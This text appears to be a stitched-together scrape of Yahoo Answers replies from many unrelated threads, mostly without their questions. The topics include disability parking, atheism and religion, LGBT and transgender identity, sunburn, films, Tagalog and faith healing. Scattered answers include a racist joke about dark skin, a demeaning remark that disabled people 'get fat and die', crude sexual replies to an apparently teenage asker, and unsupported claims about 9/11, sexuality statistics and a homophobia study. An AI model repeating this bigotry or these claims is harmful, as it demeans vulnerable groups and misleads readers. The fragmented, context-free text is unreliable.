Park farther, more excercise duh|`|IwBIM1tVaa	The YMCA isn't a gym wise guy it is a community service organization.  http://www.ymca.net/about_the_ymca/|`|YTgw2VQjaa	Aren't you discriminatory.  Not all people who have handicap parking are fully handicapped and can't exercise.  There are also a lot more programs at YMCAs than just exercising and sports.  Besides, its against the law not to have any available.  Geez... get a life and treat handicapped people with more respect!  I'm one of them!|`|Oa4QZGXSaa	some people have asthma and are considered handicapped. it could be anything with their lungs,  not what you can see on the outside.|`|9cpKYneZaa	First of all that's a really mean-spirited question. People in wheelchairs and who are partially disabled do use the services of the YMCA including the pools, basketball courts and so forth.    Second of all, the Americans with Disability Act requires complete access regardless.    Assume you have a disabled person with a child. The child goes to the YMCA. The disabled person is entitled to accompany his or her or even their children to the YMCA.|`|9XigdRoiaa	You are right, they just sit around and get fat and die.|`|nKEKG0Cqaa	ever heard of the special olympics?  or laws that protect the disabled?|`|9vzfI4kDaa	well for one thing, they have very good exercise in swimming if there is a pool there.  and i am sure they use free weights, etc.|`|FrNUIdF4aa	You're a terrible person for even asking this question.  I'm disgusted.|`|bi9EsTReaa	Good Question!! Hmmmm....maybe cause you know how old people like to do that swimming exercise thing....lol or they just mistake it as a nursing home...:o|`|1fjXNY7Waa	Hmm, I bet if you jump off the roof and hurt your spine just right, you would become a paraplegic. Then you would have a great parking spot at the Y.

Also what if you're just picking up someone, and last its federal law to have them|`|HZojX6tsaa	LOL damn them!|`|ZTNMhcyJaa	there are handicapped people who go there.. often to do water aerobics or therapy.|`|ONklVrdBaa	Well if you think about it, extremely handicapped or "crippled" (no offense, please) people cannot drive.

Now if they tried to do it in school, I could see fighting it.      Is World net a fundie site?|`|ridu0Rtwaa	Forcing a child into being christian is being seen more and more as child abuse!!    So many teens are turning atheist and being persecuted by their parents that the parental abuse is becoming more of a problem than the physical abuse!!    But your post sounds highly unlikely to say the least!!  Whilst the "No god" poster campaigns have sprung up around the world, Italy banned it from the start!    It also seems highly suspect that no major paper anywhere in the world including America and Italy seems to have heard of it either!!    So until you post where you got this information so that it's source can be checked it is simply going to be seen as just more false claims!!!    And that can only increase the anti christian movements!!    As soon as Christians rediscover the loving god and start acting like it the problem will cease!!!!|`|i0OVwfcyaa	Did you miss the part where parents of unbaptized children can't enroll them in certain programs and therefore are restricted in their choice of beliefs?

Yahoo search it yourself if you think it's phony.     This is yet another warning about the true destructive evil of organized atheists.  Any Christian who thinks atheists just want us to leave them alone needs to read this story.  This story is proof of the old adage:  All that is necessary for Evil to prevail is for Good men to do nothing.  Catholics and other Christians:  Don't do nothing.  Be prepared to stand up for your rights, and when necessary fight hard to defend what is right and Good.    I pray that one day all of God's Creation will be reconciled to Him through Jesus Christ.

zs4KZMsDaa	Cause some people consider things as femininity and masculinity "gender" as a big issue.. and therefor those who try to portray the other gender/some new mysterious 3rd gender falls into this category... called trans-gender.  I don't understand who came up with the name trans-gender.. but whatever. It's very confusing to me why they are linked together. I don't understand it myself...     I do know though my trans support group left the LGB"T" community cause of a few disputes, but im sure getting 18yr olds in drag who are obsessed with their sex life didn't help the situation. Even tho i do agree that both are minorities that fight for a good reason an should support each other... but yeah Sexuality and Gender Identity are very different in so many aspects... all the transsexuals I know also were hetero before transition and stayed in their marriage even after transition.. with kids. I never wanted to go to the LGBT community, mainly cause there weren't really many transsexuals there.. and secondly... being around gays did nothing for me. anyways this isn't much of an answer anymore, but I guess they include trans-gender cause most homosexuals identify with different genders... (butch men/girls v.s. Pretty boys/Ladies.)|`|oY4vwdjVaa	We're a group fighting for equality for people whos ideas of sex and gender are different than the 'norm'.|`|VRsu7c3Paa	Being transgender is not a sexual identity, it's a gender identity. Many transgender people are deeply rooted in the gay lesbian, and bisexual communities.     Many gay and lesbian people have transgender attributes which I believes helps  group us together as sexual/gender minorities.    The butch lesbian that has short hair, and a masculine gender expression can be considered transgender. A feminine gay man with long hair that likes to wear sparkley clothing can be considered transgender. Their gender expression is different from the "norm."    The transgender community has been very supportive of the gay community. Heck the stonewall riots that started the gay movement happened with the original bottle toss by Silvia Rivera (a transgender woman).|`|Dkylapi6aa	because the heteros persecuted the trannies so being the open minded group GLBT is, they accepted trannies as part of the family|`|YTgw2VQjaa	They are all in the same "box" because they are all having issues with their sex, whether it be orientation or identity.  And a pre-op transgendered person who hasn't legally changed their gender is technically gay if they love the same gender they were born as.  Plus they all go through the same kinds of discrimination based on sex.  They have a lot in common and sometimes share the same environments.|`|PLZrvfFEaa	Well it has something to do with the gender change and stuff but...its kinda hard to explain...|`|78kT0KSEaa	I've been thinking about this, the only reason i can come up with is that minority groups have more power when united together|`|psUL6906aa	They are all sexual minorities and plus alot of the time mtfs live as gay men and ftms live as lesbian women before they transition.     I like being part of the gay community (though I am trans), its a nice place to be :).|`|gLVbSrx6aa	i think it is because society tends to group people into categories, and where else would transgendered people go? i agree, it's as if society wants to lump everyone "abnormal" into one category that encompasses all.    personally i see a distinction.  gay men/lesbians are men/women who are attracted to others of their same sex.   transsexuals feel as if they are the opposite sex and THAT is why they are attracted to their same sex.|`|AA12006309	Because we are all considered "sexual minorities".  Transgendered persons as a group also contains Gay, Lesbian and Bisexual members.    And who are you calling a "freak"?|`|I0xO8IAHaa	because they kinda mean the same thing because technically ur gay if ur transgender because you may have sex with the same sex so there is a connection

znt2s3sMaa	You've mentioned some good things that you do...but have you TRULY submitted yourself to Jesus?   Have you truly repented of your sins?    I used to have a problem with alcohol and drugs,among other things.  When I broke down at rock bottom, I begged God to forgive me....and He IMMEDIATELY got rid of those things for me...I literally hated them after that!    You have to truly submit to God and want to follow Him.   As David says in the Psalms,  God will "hide His face" from us when we sin and don't confess and repent.    The more we sin without honest repentance, the less we hear from God, and the harder our hearts become.    Until He is no longer there at all.......|`|TKZAYJokaa	ok, i used to feel like you and was even an athiest for a while. but then i had a daughter. and it was amazing!!

TinNG7k7aa	When i was young, I was routed into the catholic faith, but it was never right.    I had my own ideas and needed to pursue them. Being part of the destructive nature of organized religion, especially one like catholicism, felt like being trapped underwater. It was intellectually suffocating and was nothing but a popularity race to see who could be the most popular in their apparent piety.    I see the hand and work of God in nature, in science, in energy and in life. And God is independent of all religious structures on this planet.    So really, what my understanding is has not changed.

But thats where her church experiences end.  Dad was brought up in Christian churches too    My parents, especially my mom, chose not to push religion or faith on us, my mom didnt think it was right.  So we never did go as a family or anything like, unless it was a wedding.  Instead it was our choice whether to attend a church and which one(s)    I went to vacation bible school growing up at the Baptist and Methodist at one point (2 different years) and use to be a nursery attendant for a Nazarene church.      Now as an adult I don't attend any church for personal reasons (anxiety issues make me feel like I don't belong, no matter where I am) and with my son it's the same way.

oiPrycbJaa	I don't look for love, but I will list down the traits I am quite fond of.    I like someone intelligent and articulate so I may have interesting and challenging conversations/arguements with them. The intelligence is very important, I do not like having to speak to an empty can.    She has to speak well, because to me, the voice is very very important.   (edit: YOU, a bogan? HA I'm sure you're not :-P But hey, aussie accents are hot; my cousin migrated to Sydney years ago and I totally enjoy talking to him over the phone :-P)    Hair doesn't matter, really. As long as it's not ugly. Like a mullet, God I hate mullets.    Clothes and style, well, stylishness is a plus because I have to admit, this is my superficial side and I like someone who looks good :-P    Religion doesn't matter at all, unless she tries to force me to follow hers.

They have a scale that goes from 0 (exclusively heterosexual) to 6 (exclusively homosexual).  Frankly, there are really very few 0's and 6's.    A major university did a study once where they had a group of males fill out a survey to determine how 'anti-gay' they were.  They then instrumented their genitals to detect how aroused they were, and had them watch gay porn.  Interestingly enough, the more homophobic they were the more likely they were to become aroused.  Really homophobic people are often just frightened of what they feel and are compensating.    I think you should stop trying to label yourself and just be you. If you find a girl that you want to experiment with (not really that difficult) then you should experiment.  After experimenting with a couple of girls then you can see how you like it.    Don't worry about what other people say.|`|Li1mDuUDaa	Well, we ALL a bit gay if we like it or not.

When you decide that you are willing to have sex with a girl or a relationship with one is when you'll know for sure.|`|KBBonf97aa	It's perfectly normal for teenage girls to experience attractions to other girls that ultimately have nothing to do with their sexual orientation.  When kids assert their independence from their parents, they form intense bonds with their peers.  Add to the mix a huge jolt of hormones and you'll get all sorts of attractions that don't necessarily mean a thing.    Television and movies have made it fashionable for kids to declare themselves bisexual, which hasn't helped matters.  In fact, that makes life much harder for kids who are struggling to accept their genuine homosexuality.  For them, sexual orientation isn't an accessory they can wear and discard when it's no longer in style.  But a lot of kids who call themselves bisexual are giving themselves license to use other kids for experimentation without any regard for the consequences.  Very often, they use and toss aside gay classmates so they can satisfy their curiosity and test their own boundaries.    Don't stick yourself with a label, since the odds are huge it won't apply to you in a few years.  If you attend your 10-year class reunion, the vast majority of the people who called themselves bisexual in middle and high school will have grown up to be happily heterosexual (10% will be gay, statistically).  And it's a lot easier coming out of a closet than going back inside.  I have a friend who announced she was bisexual at 15.  By the time she entered college, she knew she was 100% straight.  More than a decade later, there are still people who won't let her forget that she came to a stupid and wrong conclusion when she was basically a confused kid.  And she'll be the first to admit that she wouldn't have declared herself bisexual if it hadn't been considered cool to do so.    A lot of posters will tell you to experiment with boys and girls to figure out your sexuality, but that's just stupid.  Sexual orientation is as innate to a person as eye color or musical talent.  It has nothing to do with sex acts.  Gay men can have perfectly fun sex with women, but it doesn't make them straight.  Sex is just stimulation.  If a woman has a vibrator, does that make her a toysexual?    Your sexual orientation will sort itself out over the next few years with no action required on your part.  It's completely normal to be confused at your age, but you can't decide your orientation.  If you've always been attracted to guys, you're probably straight.  And even straight women recognize that women are sexy.  The entire advertising industry is built on that fact.  Just try not to overthink things or assign too much meaning to what you're feeling, since it's perfectly common and will change with time.  In a few short years, the confusion will evaporate and you'll know exactly who you're supposed to be.|`|FrNUIdF4aa	I think your bi.|`|f4x7V1sZaa	if you see a girl and you think shes hot.... or if you just wanna f*ck her|`|8rlKCCkOaa	if u get that tingle down there then you are.|`|QC7QgTZ9aa	I AM WONDERING MYSELF PLEASE SEND ME THE ANSWERSSS TOO IF YOU EVER GET EM|`|9XigdRoiaa	Look at a picture of a naked girl, then a naked guy.

It just takes longer as they have more melanin than people with lighter skin.|`|Z6ZM9p1waa	i wonder that 2|`|3qqvFEsHaa	they can  Their skin is dark though to help prevent melanoma    They can get it anywhere just like anyone else|`|H8XpaaPDaa	yes, it just doesn't show as much. but if they do get sunburns, it still hurts to touch.|`|AA10471659	The Ultraviolet light that causes the skin to burn will burn everybody eventually. blacks tan and burn, you just don't see it as well.|`|AA11253664	although it is not "seen" they do get burned by the sun, but not at the same rate as white people|`|EE9F6q3Jaa	everyone can get sunburned...  it's the sun, it burns everyone  it's like asking- her skin is darker than mine, but if we both touch a burning pot will my hand only get burnt?|`|SxejtImxaa	They just look dark because God stood them up against a wall and spray painted them that way
7cjn2u9uaa	because their head is already up their @ss|`|AA10578359	Because they are less likely to have a heart attack while panicking about what it was they did  to make God so angry at them.|`|Lc5FtItDaa	How many points do you have to waste?|`|3ibsZ4mTaa	Atheists spend the first 5 minutes in survival mode, while Christians spend that time in prayer mode. A 5 minute head start can make a big difference.|`|ridu0Rtwaa	Because they have no invisible means of support so get themselves out of trouble!!|`|fUDlbOP0aa	because the religious believe god will save them and atheists see that nothing will save them but themselves.   and if the disaster is really bad ,the religious may give up hope of life thinking its the Armageddon and that the day of judgment is here, they're all gonna die. The atheists quietly conclude the religious are crazy and work the rebuild and save themselves.|`|gAzb5PAbaa	Because we'll actively try to do something about than pray about it.|`|xTcjL7a5aa	Because they're smarter....|`|gJ8F634Haa	Because their survival instincts kick in, instead of guessing that it may be the end of the world and sky may open up at any second and suck them up.|`|ffb16e0ffc6a4152dbf3d94c25cd5995aa	Are they?|`|RyhluHk3aa	Oh, I can't wait for this...... fire away in the additional details, we're waiting.............|`|BTvSJcFlaa	It really depends on how prepared a person is, not their belief.|`|SzqCD0G0aa	christians are more than likely screaming "the end is here!!!!!!!" and praying they don't go to hell.|`|UptQ1JFZaa	I imagine that the survival rates are about equal when it come to atheists and theists.  One one hand atheists are more likely to take a more active approach to surviving, as opposed to just siting down and praying (and I'm not saying all Christians would sit there waiting for god to swoop in to save them).  On the other hand, a belief that there is a god watching over you can give someone hope which will give them a psychological advantage.|`|8a85cf9e66383ca41e15a4ee6a501d2faa	Maybe God is, in His infinite mercy, giving them time to repent.

Yeah, I'm in lots :P  Never been with a girl but hey the time will come.|`|oSA9Wsv1aa	More than anyone possibly could. I keep checking back,and no one else answers.This might be why. Everyone else is seen each other. And were whats left.|`|gLVbSrx6aa	YES  the perfect guy for me lives six states away from me :/|`|AA10579309	Yes, and I have concluded that all the single gay men are douchebags.  I'm through with dating!|`|ohWdv6iHaa	Ha ha, yes! A lot of people within the LGBT community have a lot of trouble within the dating scene, partly because only about an estimated 10 percent of the population has an "alternative sexuality", so there are less people in the dating pool to begin with.

I am still waiting for my gift with 4 wheels.|`|Gb1bVKBCaa	Fortune cookies, and any kind of professional prediction is not magical, special, or true. It is fantastically general, and can apply to most people.|`|176PIYNVaa	Nope.  But one did. It said "You will meet a young girl. You will pay her. She is our cashier.".|`|6WQo6RpSaa	Not always, but even if it doesn't come true at least I'd have a cookie! :D|`|cECRv4NMaa	Fortune cookies are made in America and are for entertainment only.

ohWdv6iHaa	Yes, I found this movie to be very sad... It is absolutely tragic to lose a gay youth due to suicide when society pressures them to be different, the story of Bobby Griffith is really heartbreaking, this was the saddest gay movie I ever saw.|`|N40HrW8haa	It was touching, but I didn't cry.|`|tvnakxDbaa	I really really wanted to watch this!   I dont have cable. so thanks for the link :D  I think I'm going to cry if I watch it,  Im a sucker for everythingg hehe.   It seems like a really touching movie (:  pride.|`|I0xO8IAHaa	to be honest i didnt cry well i tried not to..|`|VhdO03p3aa	OMG. Thank you so much for that link. I saw a 1/4th of it and it made me cry andI've been looking for a place to watch it again. Thanks! :D|`|N73oZyY8aa	Yes, it made me cry. I don't know if it's the saddest ever because I found the ending uplifting.|`|2uUctFHEaa	i just got done watching it. i cried the most when she hugged that boy near the end. also when she broke down and said she was the one who killed her son. i wanted to break down and cry.|`|oY4vwdjVaa	I only cried once. At the end during the moms speech. How touching!  -  I forgot to add that my husband didn't. I'm pretty sure he has no soul. :p ?|`|OsxQNDHzaa	I cried when she was crying to the preist  "How can Bobby ever forgive me?"    I cried like a baby!!  :@)|`|r7Vhc9zNaa	OMG ive seen it like 4 times its so sad. but i think that its prolly my favorite movie. it also helped me become comfortable w/ hu i am and made me realize that i wasn't going 2 hell 4 sumthing i cant control. I cried practically the whole movie!|`|Rt0e1eEeaa	Never seen it before, watching it now.    So fat it's a good movie...    EDIT: Why did you show me this movie? I"m crying right now. I just watched the ending. I'm in the closet so I know how he feels.|`|T2h6Z6kCaa	I cried my eyes out also...................|`|FJPKtZN5aa	it was a great movie, and i think it was the first movie ever to make me cry|`|rLQjapibaa	Movies don't make me cry, but this came close|`|SsEAvhs7aa	I beg to differ. To me the palm goes to both The Crying Games and to M Butterfly for the saddest gay movies.|`|78kT0KSEaa	it was hard hitting, the end where she hugged the kid on the mailbox was the strongest part|`|195738faa9bd63e11f670c0376aea1a1aa	It made me cry, but I don't think it was that sad...I just thought it was  really touching. Especially the part where she was at the parade and she gave that guy a hug. and the speech part was good too.  But definitely not the saddest movie I've seen.|`|wnSvjwWuaa	I haven't seen it, but I've been hearing about it for quite sometime now, thanks for bringing it up, I'll be sure to look for it.    I have been known to well up profusely, so chances are, I will when I see this movie, thanks again for the tip!|`|AA12006309	Sorry, I'm sick to freaking death of hearing about Prayers for Bobby.    The only movie that ever made me cry was Edward Scissorhands.
wvnZwO2Oaa	there's a fine line between disagreeing and flat out being rude and making no sense. If the person just simply has a different viewpoint and is presenting his or her case in a appropriate manner, then by you overreacting, you are being narrow minded. If the person is flat out rude and just goes "well you are an idiot" or doesnt have a good argument for why he or she doesnt agree with you, then it;s a different story|`|h9uGsFfTaa	I agree. People need to move the hell on. Like we care about their anger management problems....|`|R2iCzRjsaa	Wow,  are you a piece of work....you say here that you want no answers unless they agree with you.  I guess the truth is that you are NOT asking questions, you are asking for people to support your stance and what you've done.  Well, Sugar-dumplin' that just "ain't" the way the world works, or this forum    You ask a question, we answer a question.  You calling people idiots for not agreeing with you makes me think they are not the one who is an idiot.|`|wY2k1cHVaa	They have no life. And all they want are 2pts.

0ZM3TCXCaa	One possible career could be a Child Protections Social Worker. You go in and investigate abuse claims and help the child be placed if there is abuse suspected, among many other things to help children out. To be a social worker you need to go to an accredited social work program at a college, and get your license after you graduate.

029366e443f706114f76140b91711233aa	One day a while back, a man, his heart  heavy with grief, was walking in the woods.  As he thought about his life this day, he knew many things were not right.  He thought about  those who had lied about him back when he had a job.     His thoughts turned to those who had  stolen his things and cheated him.  He remembered family that had passed  on.  His mind turned to the illness he had, that no one could cure.  His very soul was filled with anger, resentment, and frustration.     Standing there this day, searching for answers  he could not find, knowing all else had failed him, he knelt at the base of an old oak tree to seek the one he knew would always be there.  And with tears in his eyes, he prayed:     'Lord- You have done wonderful things for me in this life.  You have told me to do many things for  you, and I happily obeyed. Today, you have told me to forgive. I am sad,  Lord, because I cannot, I don't know how.  It is not fair Lord, I  didn't deserve these wrongs that were done against me and I shouldn't have  to forgive.  As perfect as your way is Lord, this one thing I cannot  do, for I don't know how to forgive.  My anger is so deep Lord, I fear  I may not hear you, but I pray you teach me to do the one thing I cannot  do:  Teach me to forgive .'    As he knelt there in the quiet shade of that old oak tree, he felt something fall onto his shoulder.  He opened his eyes.  Out of the corner of one eye, he saw something red  on his shirt.  He could not turn to see what it was because where the  oak tree had been was a large square piece of wood in the ground.  He raised his head and saw two feet held to the wood with a large spike through them.     He raised his head more, and tears came to his eyes as he saw Jesus hanging on a cross. He saw spikes in His hands,  a gash in His side, a torn and battered body, deep thorns sunk into His head.  Finally he saw the suffering and pain on His precious face. As  their eyes met, the man's tears turned to sobbing, and Jesus began to speak.     'Have you ever told a  lie?'  He asked?     The man answered - 'Yes,  Lord.'     'Have you ever been given too much  change and kept it?'     The man answered - 'Yes.  Lord.'  And the man sobbed more and more.     'Have you ever taken something from work that wasn't yours?' Jesus asked?     And the man answered, 'Yes,  Lord.'     'Have you ever sworn, using my Father's name in vain?'     The man, crying now, answered - 'Yes, Lord.'     As Jesus asked many more times,  'Have you ever'?  The man's crying became uncontrollable, for he could only answer - 'Yes, Lord'.     Then Jesus turned His head from one side to the other, and the man felt something fall on his other shoulder He looked and saw that it was the blood of Jesus. When he looked back up, his  eyes met those of Jesus, and there was a look of love the man had never  seen or known before.     Jesus said, 'I didn't deserve this  either, but I forgive you.'     It may be hard to see how you're going  to get through something, but when you look back in life, you realize how  true this statement is.     Read the following first line slowly and let it sink in.     If God brings you to it - He will bring  you through it.     When Jesus died on the cross, he was thinking of you!|`|09ef400ecd1475bf913602053ad3f68aaa	Randal, read the book of proverbs at least once over.

What I usually do is I go to biblegateway.com and I type in keywords that pertain to my situation or describe the type of people I'm dealing with and I get great results. Here are a couple that have helped me (found with the keyword: malicious):    They are concieted and understand nothing.  They have an unhealthy interest in controversies and quarrels  about words that result in envy, strife, malicious talk, evil suspicions  and constant friction between people of corrupt minds,  who have been robbed of the truth,  and who think that godliness is a means to financial gain.    1 Timothy 6:4      Like the ungodly they maliciously mocked;  they gnashed their teeth at me.  How long Lord will you look on?  Rescue me from their ravages,  my precious life from these lions.  I will give you thanks in the great assembly;  among the throngs I will praise you.  Do not let those gloat over me who are my enemies without cause;  do not let those who hate me without reason,  maliciously wink the eye.  They do not speak peaceably,  but devise false accusations,  against those who live quietly in the land.  They sneer at me and say "Aha! Aha! With our own eyes we have seen it."  Lord, you have seen this; do not be silent.  Do not be far from me, Lord.  Awake, and rise to my defense.  Contend for me, my God and Lord.

I do believe in God, someone has to create us all but beside that God has helped me a lot of time when I prayed to him, but I'm a good person, I follow god rules and all so he actually listen to me and I can alway see when he helps me.|`|wgoItvETaa	well first of all there is a God and he created everything here you see right now. god has always been and always will be...i know it is kind of confusing to think about but would you rather believe in the everlasting god or the everlasting dust (so called Big Bang) the big bang does not make any sense and has no logic to it. there is no magic but there is a God with power and he is out there watching over us... he loves me and you even if you arent a believer... i know that god is out there and he  is my father...you should come to believing in him and read is word...but if there is no god(which i am not saying there isnt) and you still believe in him wouldnt you rather take the chance and believe in him than not believe in him and go to perish in hell for eternity? that is a question for you....GOD BLESS YOU HE LOVES YOU|`|jdKOejikaa	the chicken smoking the cigarette came first|`|EtMW3RY0aa	"I don't know....."|`|8Id7BCpTaa	If in the beginning there was God and all his angels, why did he feel the need to create such a flawed creature as man kind?

They think for themselves.|`|41f250e890923fedf85e19be6b82cb3faa	Atheists are more likely to think things through for themselves.    Christians are more accustomed to making leaps of faith, and you certainly need to make many leaps of faith to believe the official story.    I've noticed that when there are 9/11 questions in Religion and spirituality. the majority believe the official story.    In News and current events the majority disbelieve the official version.    The story of 19 arabs, and a mastermind plotting in a cave, is a bit like a Bible story-highly unlikely.|`|AA10530949	Atheists like the idea that people are "out to get them"--the government and theists alike.  That's why they freak out whenever there's any mention of religion anywhere.  It definitely makes them more inclined to buy into the 9/11 conspiracy bullsh*t!|`|mcDcKr54aa	Well Atheists have nothing to believe in so they believe in $ ^! conspiracy theories.

swkhohjgaa	relax Your normal    Fear is a good thing, Its a sign that you are thinking rationally, not emotionally. Use it as a guide but dont let it control you.     I dont doubt that you know what you want and who you are. We all knew at your age.    The process takes quite a while so dont think about everything at once. Just take one step at a time.           You dont mention going to a therapist. If not you will need to go to one before you can begin hormones anyway. Try to find one with gender experience and they will help you understand your fears and what transitioning is about and what is right for you. Try to find a local group they often have lots of resources you could use.      Have a safe journey|`|yzgS5KiQaa	You don't have to have hormones you know. If you don't want to. And you don't have to take hormones as a requisite for top surgery either. In fact, you can get a breast reduction without seeing a gender therapist at all. Also, hormones will not make you another person. And you won't dramatically change overnight. Maybe you could take hormones for just a year an then stop when you feel you are masculine enough. Plus just practice with the voice, it will come around. Your transition is for you, remember that. There are people who will want you to do everything to "become male", because once people accept you can be born with a sex/gender incongruency, they want to cut sew and stitch you up and forget about you. Don't let their fear of you make you feel that these things are necessary for you to be male, and don't let them make you think your body is not beautiful no matter what stage of your transition. They want you to sterilize yourself by removing your sex organs, risk losing thee ability to orgasm by having bottom surgery, I mean this is for you to feel more comfortable about you. If you don't feel comfortable with something, don't do it. Just because you are FtM doesn't mean that you have to do anything. You are as much as a man pre op, post op, or non op. Transitioning is for the sole purpose of making you more comfortable: Not, making you a man, you always were, always will be.|`|7aK81hsbaa	until you reach 18 you'll need parents permission to begin hrt.

I think it might help if you could talk to people in person who know where you are coming from.  If that's not an option you could look into an on-line support group.|`|AA12006309	Life is nothing without risk.    You will have to take some risks in order to get where you want to be.  One of those risks is taking the first big step of starting hormones.  You should be under the care of a gender therapist, who will help you with your initial fears about transition, and help you decide what the best course of action is for your individual situation.    Change is scary, whether it's small change, or monumental change.  Find strength in your fear, and don't let it hold you back.  The rest of us will be here for you to fall back on.    Edit:  I understand your problems passing.  I have difficulty lowering my voice, and I also have 38DD breasts.  Thankfully the binder I bought - if I double it up on itself - does a fairly decent job of flattening me out.|`|65QqZBnjaa	I'm post-transition, do you want my opinion?  :p    What you're experiencing is perfectly normal.  After all transition is a huge undertaking.  This is one of the times it's good to have a therapist.  Talking with them is a good, unbiased place, to deal with these issues.  It might also help to other trans men.  A good active on-line support forum that has a large number of trans men is:    http://www.Susans.org  Don't be fooled by the name.  Click "Forums", then "Transsexual Talk" and the FtM section is right on top.    What you're experiencing even has an acronym: FUD, which stands for Fear, Uncertainty and Doubt.  So don't worry we've all been there.  The important thing is to reach out and connect with others and your therapist.  Eventually it WILL pass.      edit: Another vote for the Dr Becky GENDER therapist listing:    http://www.DrBecky.com/therapists.html|`|psUL6906aa	I'm a 17 year old MtF and before I start taking hormones, etc I will have to be 18 (so I will already be out of high school).

But in the moment I am just trying to get through school without being flogged by all of the bigots (I live in Iowa).     Just curious: Have you started living as a man yet?|`|0xz8mR2xaa	I have no narrative to share, but I think you'll like this Internet community. They deal with coming out issues, especially among the highschool-college age group.    http://img.420chan.org/cd/|`|lezn2xG3aa	Awww man. That must be really hard!   No, I am not going through what you are going through and I have no idea how possibly difficult this must be for you, but good luck, and don't be afraid. I actually do volunteer work at a teen health center, and one of our support groups is for transgendered teens. All I can say is, that working there, everyone was scared at first, but everyone felt happier with themselves after the change. Only you can decide for yourself if this is the right time for the change or if you should change at all. Just do what makes you happy, even if it is scary! Just hearing what you said, I think you will be happier. All the people in the support group said they felt better after talking about it. I would see if you can find a support group near you. It really helped everyone here.   Good luck, and I really hope you feel better. I'm glad though that you are already beginning to look at your options. Do what makes you happy, wether its as a boy or a girl is your decision. I know I'm probably not being much of a help, but I just think you may need someone to talk to, which a support group might help with.|`|dW9wcYiNaa	I'm scared too.  I have a lot to work on and I wonder if I just try to live as a woman, I'll learn to accept it.  But my feelings haven't changed.. You have to decide what option is more painful to you.. to continue living as you are or go thru hormones and surgery to try and free yourself the best you can..    Are you seeing a gender therapist? That's a good place to start.    http://www.drbecky.com/therapists.html|`|3OZgcntfaa	You'd be insane if you weren't nervous. A healthy dose of fear and anticipation can make you think long and hard about the ups and downs you will face on your transition.    The initial phase I needed to get over was the stigma of going to a mental health professional. I didn't want to be told I have a mental illness. I didn't want people to call me sick or crazy. I just wanted a doctor to help me live in my body without what I thought would be years of jumping through hoops for shrinks.  The real amount of time I spent in "diagnosis" to get some lady to say 'Yes, he's a man'. was four one hour sessions over a month. Freaking cakewalk. At that point it wasn't even to assure me, it was for my mother's assurance and so I could go ahead and start hormones right away.     If it wasn't exciting you and making you feel a bit overwhelmed, I would say something was amiss.    Transitioning for me has been the greatest journey of self discovery I could ever hope to embark on. I almost feel bad for the cisgender (non trans) people out there who never take this much time to truly explore who they are as a person.
AA10278041	In shallow, conversational Tagalog, it may well be sufficient.    "Ang" is added between 'ko' and 'matulog' (ko+ang=ko'ng) to make it grammatically correct.|`|Rt0e1eEeaa	you forgot to put "ang" in between ko and matulog.

I like sleeping. - "Gusto ko parating matulog."        "Gusto ko matulog" in English is "What I want is to sleep."        By the way, the above answerer is not right. There's no such thing as "k'ang". If you are going to join "ko" and "ang", it should be "kong".    E.g.  "Gusto ko ang matulog." would be "Gusto kong matulog."      Hope it helps!

Generally they have a major crazy preacher who is well skilled in the art of mind control. I have not heard recently of there being a group of this religion as it has become unlawful. I however saw an episode of I think it was ER where they had a family of this religion so there may still be some out there. Or it may just be unlawful for parents to make this choice for their children.|`|UrNMuhFKaa	Well this answer for sure will be an incomplete answer because I have now thought about it for maybe 20 seconds.   The first principle that comes to mind is God gave us free choice. He tell us in the book of Proverbs to search for wisdom - I think it would be basically foolish to not go to a Dr. The bible is clear that fools will suffer from their foolish choices.  I think you should also pray.   Even in the bible the miracles were rare - that is one reason they were called miracles. I think many people get so caught up in spiritual thinking they loose there grasp on simple plain common sense. And, yes i think common sense is a gift from God and not just for Christians.   Sorry I am no theologian. Just a regular person.|`|yDJiiqcsaa	Yeah !!  And if you really believe why open your eyes when you drive your car ?  Get real - God gives us our intellect to use and the science of medicine is knowledge gained through the intellect that He gave us, just like the eyes to see when we drive - we use those gifts/faculties as well as we can and where it is beyond that scope - we call on God for help.|`|HrQDQvUUaa	I have been instantly healed of illnesses through prayer several times, but sometimes God for His own reasons chooses not to do so. That does not make Him cruel or indifferent, He obviously has His reasons.    And if He has given skill and wisdom to doctors, should we to not avail ourselves of their services? And if He chooses not to answer our prayer for immediate healing, then we can go to a doctor as there is nothing in Scripture to forbid this.|`|2FTaKXz3aa	They believe because coincidences are enough for the most dense of people to believe.    But, they dont *actually* work|`|AA10530949	No, God is not supposed to answer all prayers.  If atheists understood that theists do NOT really expect God to answer all of their requests, a lot of this confusion would evaporate.  God does NOT answer all prayers.  God intervenes in our lives in very subtle ways and probably not too often.  Most of the time, what we pray for is not what God wants, so he doesn't come into our lives to change it.  Praying for health instead of going to the doctor is stupid.|`|O3WYA3WGaa	Yeah, I don't understand all that "no, I don't need a doctor, God will heal me" stuff either.  God intervenes when it serves a purpose in His big scheme of things.  Listen to that song "Three Wooden Crosses" by Randy Travis. You can see why that hooker survived the crash.    Certainly we should all pray for sick relatives, etc. But, God may not intervene if it will not serve a purpose for the big picture.    ETA:  Pamela, that did happen recently. A teenager was a member of a church that taught that false doctrine, and he refused medical treatment, and died.|`|MM5iGrnIaa	God used the hard heart of pharaoh( King of Egypt) to deliver the Hebrews out of bondage.  I was born with cerebral palsy, and because of that my motor skills were damaged.  Luckily, it only affected my left extremities ( Left arm and leg).  Another side affect of this disability was I couldn't straighten my left arm out all the way. Soon, My family and I asked a few doctors to see if they could perform an operation to straighten my arm, the conclusion was  not so good; they said it couldn't be done unless they disabled the arm completely ( wouldn't be able to use it at all)  I prayed to God to make my arm better, so it  would be like my good arm. The conclusion of that prayer was meeting a doctor who said it could be done, and I would still be able to use it.  They performed surgery on me, and now my arm is better in every way then it used to be.  The only thing about it is that my arm is  more sensitive( a minor consequence) ;That is a miracle to me.    When I was very small my mother wanted to go to college, and we had to move to Kansas  so we would live closer to her school.  Right after we moved out, apparently the house was broken into by a armed man that the FBI was looking for.  Not only that, but soon after that incident the house burnt down around the 4th of the July of that year( or maybe it was the following year, I don't remember).  We moved just in time to avoid  all of that.    When I was in high school, I had some serious problems, and I was always getting into trouble.  I didn't care about anything; I was getting straight Fs's , I did not do my work.  Finally I was kicked out of school and sent to a behavior school.  That is when I met a teacher there, who was also a pastor, and It was there when I found out who Jesus was, and learned that I am not a bad person, I just made some bad mistakes. I also passed with flying colors.  To me that was God. reaching int o my life very quickly.    This pastor didn't "indoctrinate", I became curios why he wanted to be around delinquents. Instead of regular kids. What he said in return  was kind of what Jesus said about  he's here for the sinners, not the righteous.  He wanted to help kids like me straighten up.  I got curious about Jesus, and started reading the bible. When I did that, I asked him questions and decided to convert.  I then started going to this pastors church, because I know he's a real good guy, He cares about the people who are really 